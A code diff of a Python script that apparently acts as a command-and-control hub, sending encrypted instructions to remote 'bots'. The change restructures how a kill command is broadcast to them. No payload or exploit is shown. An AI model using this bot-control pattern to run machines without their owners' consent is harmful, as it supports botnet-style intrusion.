@@ -4,7 +4,7 @@ import threading
 from random import randint
 from cryptography.fernet import Fernet
 
-icon = """
+icon = """\
 █▀█ █▀█ ▀▀▀█ 
 ░▄▀ ░▄▀ ░░█░ 
 █▄▄ █▄▄ ░▐▌░
@@ -61,13 +61,6 @@ def generate_random_number(length=10):
     used_ids.append(random_number)
     return random_number
 
-class KilledByOfficier(Exception):
-    "Raised when connection is killed by distant officier"
-    def __init__(self):
-        for bot in args.bots:
-            kill_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            kill_socket.connect((bot, 12009))
-            kill_socket.send(b'kill')
 
 class Commander:
     def __init__(self):
@@ -164,5 +157,20 @@ class Commander:
                 raise KilledByOfficier
             print(instruction)
             self.send_instructions(instruction)
+
+class KilledByOfficier(Exception):
+    "Raised when connection is killed by distant officier"
+    def __init__(self, commander: Commander):
+        for bot in args.bots:
+            kill_header = {
+                "subject": subjects[3],
+                "level": 5,
+                "ip": socket.gethostname(),
+                "group_id": group_id
+            }
+
+            kill_message = 'kill'
+            commander.send_instructions(kill_header, kill_message)
+
 
 commander = Commander()
